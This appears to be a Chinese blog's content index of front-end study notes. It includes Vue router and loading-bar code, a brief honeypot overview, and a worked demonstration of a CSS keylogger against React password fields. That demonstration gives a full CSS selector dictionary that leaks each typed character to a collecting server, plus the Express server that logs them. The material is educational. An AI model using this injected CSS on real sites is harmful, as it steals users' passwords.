class="string">&quot;@/components/Index.vue&quot;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> router = <span class="title function_">createRouter</span>(&#123;</span><br><span class="line">  <span class="comment">// 路由的模式</span></span><br><span class="line">  <span class="attr">history</span>: <span class="title function_">createWebHistory</span>(),</span><br><span class="line">  <span class="comment">// 路由信息</span></span><br><span class="line">  routes</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个路径白名单</span></span><br><span class="line"><span class="keyword">const</span> whiteList = [<span class="string">&quot;/&quot;</span>]</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">beforeEach</span>(<span class="function">(<span class="params">to,<span class="keyword">from</span>,next</span>)=&gt;</span> &#123;</span><br><span class="line">  <span class="title class_">Vnode</span>.<span class="property">component</span>?.<span class="property">exposed</span>?.<span class="title function_">startLoading</span>()</span><br><span class="line">  <span class="keyword">if</span>(whiteList.<span class="title function_">includes</span>(to.<span class="property">path</span>) || <span class="variable language_">localStorage</span>.<span class="title function_">getItem</span>(<span class="string">&quot;token&quot;</span>)) &#123;</span><br><span class="line">    <span class="title function_">next</span>()</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_">next</span>(<span class="string">&quot;/&quot;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 路由全局后置守卫</span></span><br><span class="line"><span class="comment">// to：要去哪   from：从哪来</span></span><br><span class="line">router.<span class="title function_">afterEach</span>(<span class="function">(<span class="params">to,<span class="keyword">from</span></span>)=&gt;</span> &#123;</span><br><span class="line">  <span class="title class_">Vnode</span>.<span class="property">component</span>?.<span class="property">exposed</span>?.<span class="title function_">endLoading</span>()</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> router</span><br></pre></td></tr></table></figure>

<p>LoadingBar.vue：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;wraps&quot;&gt;</span><br><span class="line">    &lt;div ref=&quot;bar&quot; class=&quot;bar&quot;&gt;&lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import &#123; ref &#125; from &quot;vue&quot;</span><br><span class="line"></span><br><span class="line">let bar = ref&lt;HTMLElement&gt;()</span><br><span class="line">let speed = ref&lt;number&gt;(1)</span><br><span class="line">let timer = ref&lt;number&gt;(0)</span><br><span class="line"></span><br><span class="line">const startLoading = () =&gt; &#123;</span><br><span class="line">  let dom = bar.value as HTMLElement</span><br><span class="line">  speed.value = 1</span><br><span class="line">  // requestAnimationFrame动画帧 回调函数只会执行一次</span><br><span class="line">  timer.value = window.requestAnimationFrame(function fn() &#123;</span><br><span class="line">    console.log(speed.value, 1)</span><br><span class="line">    if (speed.value &lt; 90) &#123;</span><br><span class="line">      speed.value++</span><br><span class="line">      dom.style.width = speed.value + &quot;%&quot;</span><br><span class="line">      // 递归requestAnimationFrame 执行动画</span><br><span class="line">      timer.value = window.requestAnimationFrame(fn)</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      speed.value = 1</span><br><span class="line">      window.cancelAnimationFrame(timer.value)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const endLoading = () =&gt; &#123;</span><br><span class="line">  let dom = bar.value as HTMLElement</span><br><span class="line">  window.setTimeout(() =&gt; &#123;</span><br><span class="line">    window.requestAnimationFrame(() =&gt; &#123;</span><br><span class="line">      speed.value = 100</span><br><span class="line">      dom.style.width = speed.value + &quot;%&quot;</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;, 200)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">defineExpose(&#123;</span><br><span class="line">  startLoading,</span><br><span class="line">  endLoading</span><br><span class="line">&#125;)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped lang=&quot;scss&quot;&gt;</span><br><span class="line">.wraps &#123;</span><br><span class="line">  position: fixed;</span><br><span class="line">  top: 0;</span><br><span class="line">  width: 100%;</span><br><span class="line">  height: 2px;</span><br><span class="line"></span><br><span class="line">  .bar &#123;</span><br><span class="line">    height: inherit;</span><br><span class="line">    width: 0;</span><br><span class="line">    background-color: blue;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Vue.js</tag>
        <tag>Vue-Router</tag>
      </tags>
  </entry>
  <entry>
    <title>React CSS键盘记录器</title>
    <url>/web/study/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/2.React%20CSS%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95%E5%99%A8.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1dS4y1y7vd?p=3&vd_source=abff2190dd215e2033f2ec57123dd1d6">Vue3 + vite + Ts + pinia + 实战 + 源码 +electron</a></p>
<h1 id="测试案例"><a href="#测试案例" class="headerlink" title="测试案例"></a>测试案例</h1><p>只有使用react或类react框架的项目才会导致这个问题的发生</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.bootcdn.net/ajax/libs/react/16.13.1/umd/react.production.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.bootcdn.net/ajax/libs/react-dom/16.13.1/umd/react-dom.production.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.bootcdn.net/ajax/libs/babel-standalone/7.0.0-beta.3/babel.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/babel&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> <span class="title class_">Ipt</span> =  <span class="title class_">React</span>.<span class="title function_">createElement</span>(<span class="function">()=&gt;</span>&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> &#123;  useState &#125; = <span class="variable language_">window</span>.<span class="property">React</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> [state,setState] = <span class="title function_">useState</span>(&#123;<span class="attr">val</span>:<span class="string">&quot;123&quot;</span>&#125;)</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> <span class="title function_">setInput</span> = (<span class="params">e</span>) =&gt; &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">setState</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">val</span>:e.<span class="property">target</span>.<span class="property">value</span></span></span><br><span class="line"><span class="language-javascript">      &#125;)</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">onChange</span>=<span class="string">&#123;setInput&#125;</span> <span class="attr">value</span>=<span class="string">&#123;state.val&#125;</span>&gt;</span><span class="tag">&lt;/<span class="name">input</span>&gt;</span></span></span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript">  <span class="title class_">ReactDOM</span>.<span class="title function_">render</span>(<span class="title class_">Ipt</span>,<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;app&#x27;</span>))</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在密码框输入内容后，发现内容被映射到了value上：</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202306291710508.png"></p>
<h1 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h1><p>攻击者会写一个CSS密码的字典表，它会把键盘上的每一个字符收集起来，发送到某个对应的服务器端</p>
<p>字典表：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 选择type属性为password，value属性以某个值结尾的input框 */</span></span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[type=<span class="string">&quot;password&quot;</span>]</span><span class="selector-attr">[value$=<span class="string">&quot; &quot;</span>]</span> &#123; <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">&quot;http://localhost:3000/+&quot;</span>); &#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[type=<span class="string">&quot;password&quot;</span>]</span><span class="selector-attr">[value$=<span class="string">&quot;!&quot;</span>]</span> &#123; <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">&quot;http://localhost:3000/%21&quot;</span>); &#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[type=<span class="string">&quot;password&quot;</span>]</span><span class="selector-attr">[value$=<span class="string">&quot;\&quot;&quot;</span>]</span> &#123; <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">&quot;http://localhost:3000/%22&quot;</span>); &#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[type=<span class="string">&quot;password&quot;</span>]</span><span class="selector-attr">[value$=<span class="string">&quot;#&quot;</span>]</span> &#123; <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">&quot;http://localhost:3000/%23&quot;</span>); &#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[type=<span class="string">&quot;password&quot;</span>]</span><span class="selector-attr">[value$=<span class="string">&quot;$codeholder_0amp;quot;] &#123; background-image: url(&quot;</span>http://localhost:3000/%24<span class="string">&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;</span>password<span class="string">&quot;][value$=&quot;</span>%<span class="string">&quot;] &#123; background-image: url(&quot;</span>http://localhost:3000/%25<span class="string">&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;</span>password<span class="string">&quot;][value$=&quot;</span>&amp;<span class="string">&quot;] &#123; background-image: url(&quot;</span>http://localhost:3000/%26<span class="string">&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;</span>password<span class="string">&quot;][value$=&quot;</span><span class="string">&#x27;&quot;] &#123; background-image: url(&quot;http://localhost:3000/%27&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;(&quot;] &#123; background-image: url(&quot;http://localhost:3000/%28&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;)&quot;] &#123; background-image: url(&quot;http://localhost:3000/%29&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;*&quot;] &#123; background-image: url(&quot;http://localhost:3000/%2A&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;+&quot;] &#123; background-image: url(&quot;http://localhost:3000/%2B&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;,&quot;] &#123; background-image: url(&quot;http://localhost:3000/%2C&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;-&quot;] &#123; background-image: url(&quot;http://localhost:3000/-&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;.&quot;] &#123; background-image: url(&quot;http://localhost:3000/.&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;/&quot;] &#123; background-image: url(&quot;http://localhost:3000/%2F&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;0&quot;] &#123; background-image: url(&quot;http://localhost:3000/0&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;1&quot;] &#123; background-image: url(&quot;http://localhost:3000/1&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;2&quot;] &#123; background-image: url(&quot;http://localhost:3000/2&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;3&quot;] &#123; background-image: url(&quot;http://localhost:3000/3&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;4&quot;] &#123; background-image: url(&quot;http://localhost:3000/4&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;5&quot;] &#123; background-image: url(&quot;http://localhost:3000/5&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;6&quot;] &#123; background-image: url(&quot;http://localhost:3000/6&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;7&quot;] &#123; background-image: url(&quot;http://localhost:3000/7&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;8&quot;] &#123; background-image: url(&quot;http://localhost:3000/8&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;9&quot;] &#123; background-image: url(&quot;http://localhost:3000/9&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;:&quot;] &#123; background-image: url(&quot;http://localhost:3000/%3A&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;;&quot;] &#123; background-image: url(&quot;http://localhost:3000/%3B&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;&lt;&quot;] &#123; background-image: url(&quot;http://localhost:3000/%3C&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;=&quot;] &#123; background-image: url(&quot;http://localhost:3000/%3D&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;&gt;&quot;] &#123; background-image: url(&quot;http://localhost:3000/%3E&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;?&quot;] &#123; background-image: url(&quot;http://localhost:3000/%3F&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;@&quot;] &#123; background-image: url(&quot;http://localhost:3000/%40&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;A&quot;] &#123; background-image: url(&quot;http://localhost:3000/A&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;B&quot;] &#123; background-image: url(&quot;http://localhost:3000/B&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;C&quot;] &#123; background-image: url(&quot;http://localhost:3000/C&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;D&quot;] &#123; background-image: url(&quot;http://localhost:3000/D&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;E&quot;] &#123; background-image: url(&quot;http://localhost:3000/E&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;F&quot;] &#123; background-image: url(&quot;http://localhost:3000/F&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;G&quot;] &#123; background-image: url(&quot;http://localhost:3000/G&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;H&quot;] &#123; background-image: url(&quot;http://localhost:3000/H&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;I&quot;] &#123; background-image: url(&quot;http://localhost:3000/I&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;J&quot;] &#123; background-image: url(&quot;http://localhost:3000/J&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;K&quot;] &#123; background-image: url(&quot;http://localhost:3000/K&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;L&quot;] &#123; background-image: url(&quot;http://localhost:3000/L&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;M&quot;] &#123; background-image: url(&quot;http://localhost:3000/M&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;N&quot;] &#123; background-image: url(&quot;http://localhost:3000/N&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;O&quot;] &#123; background-image: url(&quot;http://localhost:3000/O&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;P&quot;] &#123; background-image: url(&quot;http://localhost:3000/P&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;Q&quot;] &#123; background-image: url(&quot;http://localhost:3000/Q&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;R&quot;] &#123; background-image: url(&quot;http://localhost:3000/R&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;S&quot;] &#123; background-image: url(&quot;http://localhost:3000/S&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;T&quot;] &#123; background-image: url(&quot;http://localhost:3000/T&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;U&quot;] &#123; background-image: url(&quot;http://localhost:3000/U&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;V&quot;] &#123; background-image: url(&quot;http://localhost:3000/V&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;W&quot;] &#123; background-image: url(&quot;http://localhost:3000/W&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;X&quot;] &#123; background-image: url(&quot;http://localhost:3000/X&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;Y&quot;] &#123; background-image: url(&quot;http://localhost:3000/Y&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;Z&quot;] &#123; background-image: url(&quot;http://localhost:3000/Z&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;[&quot;] &#123; background-image: url(&quot;http://localhost:3000/%5B&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;\\&quot;] &#123; background-image: url(&quot;http://localhost:3000/%5C&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;]&quot;] &#123; background-image: url(&quot;http://localhost:3000/%5D&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;^&quot;] &#123; background-image: url(&quot;http://localhost:3000/%5E&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;_&quot;] &#123; background-image: url(&quot;http://localhost:3000/_&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;`&quot;] &#123; background-image: url(&quot;http://localhost:3000/%60&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;a&quot;] &#123; background-image: url(&quot;http://localhost:3000/a&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;b&quot;] &#123; background-image: url(&quot;http://localhost:3000/b&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;c&quot;] &#123; background-image: url(&quot;http://localhost:3000/c&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;d&quot;] &#123; background-image: url(&quot;http://localhost:3000/d&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;e&quot;] &#123; background-image: url(&quot;http://localhost:3000/e&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;f&quot;] &#123; background-image: url(&quot;http://localhost:3000/f&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;g&quot;] &#123; background-image: url(&quot;http://localhost:3000/g&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;h&quot;] &#123; background-image: url(&quot;http://localhost:3000/h&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;i&quot;] &#123; background-image: url(&quot;http://localhost:3000/i&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;j&quot;] &#123; background-image: url(&quot;http://localhost:3000/j&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;k&quot;] &#123; background-image: url(&quot;http://localhost:3000/k&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;l&quot;] &#123; background-image: url(&quot;http://localhost:3000/l&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;m&quot;] &#123; background-image: url(&quot;http://localhost:3000/m&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;n&quot;] &#123; background-image: url(&quot;http://localhost:3000/n&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;o&quot;] &#123; background-image: url(&quot;http://localhost:3000/o&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;p&quot;] &#123; background-image: url(&quot;http://localhost:3000/p&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;q&quot;] &#123; background-image: url(&quot;http://localhost:3000/q&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;r&quot;] &#123; background-image: url(&quot;http://localhost:3000/r&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;s&quot;] &#123; background-image: url(&quot;http://localhost:3000/s&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;t&quot;] &#123; background-image: url(&quot;http://localhost:3000/t&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;u&quot;] &#123; background-image: url(&quot;http://localhost:3000/u&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;v&quot;] &#123; background-image: url(&quot;http://localhost:3000/v&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;w&quot;] &#123; background-image: url(&quot;http://localhost:3000/w&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;x&quot;] &#123; background-image: url(&quot;http://localhost:3000/x&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;y&quot;] &#123; background-image: url(&quot;http://localhost:3000/y&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;z&quot;] &#123; background-image: url(&quot;http://localhost:3000/z&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;&#123;&quot;] &#123; background-image: url(&quot;http://localhost:3000/%7B&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;|&quot;] &#123; background-image: url(&quot;http://localhost:3000/%7C&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;\\&#125;&quot;] &#123; background-image: url(&quot;http://localhost:3000/%7D&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;~&quot;] &#123; background-image: url(&quot;http://localhost:3000/~&quot;); &#125;</span></span></span><br><span class="line"><span class="string"><span class="selector-attr">input[type=&quot;password&quot;][value$=&quot;&quot;] &#123; background-image: url(&quot;http://localhost:3000/%7F&quot;); &#125;</span></span></span><br></pre></td></tr></table></figure>

<p>服务端：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/:key&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  process.<span class="property">stdout</span>.<span class="title function_">write</span>(req.<span class="property">params</span>.<span class="property">key</span>);</span><br><span class="line">  <span class="keyword">return</span> res.<span class="title function_">sendStatus</span>(<span class="number">400</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="function">() =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;&gt; Ready to keylog at localhost:3000&quot;</span>));</span><br></pre></td></tr></table></figure>

<p>于是，在密码框输入内容时，会发现注入的CSS暗中发送了许多请求</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202306291720862.png"></p>
<p>而且攻击者的服务端确实收到了密码</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202306291723669.png"></p>
]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>网络安全</tag>
        <tag>react</tag>
      </tags>
  </entry>
  <entry>
    <title>蜜罐技术</title>
    <url>/web/study/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/4.%E8%9C%9C%E7%BD%90%E6%8A%80%E6%9C%AF.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1dS4y1y7vd?p=3&vd_source=abff2190dd215e2033f2ec57123dd1d6">Vue3 + vite + Ts + pinia + 实战 + 源码 +electron</a></p>
<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>蜜罐是对攻击者的欺骗技术，用以监视、检测、分析和溯源攻击行为</p>
<p>蜜罐没有业务上的用途，所有流入&#x2F;流出蜜罐的流量都预示着扫描或者攻击行为，因此可以比较好的聚焦于攻击流量</p>
<p>蜜罐可以实现对攻击者的主动诱捕，能详细地记录攻击者攻击过程中的许多痕迹，收集到大量有价值的数据，如病毒或蠕虫的源码、黑客的操作等，从而便于提供丰富的溯源数据</p>
<p>蜜罐也可以消耗攻击者的时间，基于JSONP等方式来获取攻击者的画像</p>
<p>所以蜜罐就是一个陷阱，故意暴露一些人为设计好的漏洞，让攻击者自投罗网</p>
